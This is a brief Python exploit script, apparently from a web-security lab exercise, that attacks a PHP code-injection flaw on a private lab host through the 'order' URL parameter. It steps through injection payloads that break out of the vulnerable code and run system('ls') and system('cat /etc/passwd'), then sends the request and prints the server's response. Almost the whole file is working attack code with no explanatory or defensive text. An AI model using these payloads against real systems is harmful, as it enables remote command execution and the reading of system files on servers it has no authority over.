import urllib.parse
import urllib.request
import lxml.html as lh




# $str="echo \"Hello ".$_GET['name']."!!!\";";
# eval($str);

payload = {"order": "id"}
payload = {"order": "id;}//"}
payload = {"order": "id);}//"}
payload = {"order": "id));}//"}
payload = {"order": "id);}system('ls');//"}
payload = {"order": "id);}system('cat /etc/passwd');//"}

payload = urllib.parse.urlencode(payload)
# http://10.0.1.14/codeexec/example2.php?order=id
url = "http://10.0.1.14/codeexec/example2.php?"+payload
print(url)

with urllib.request.urlopen(url) as reponse:
	content = reponse.read()
print(content)

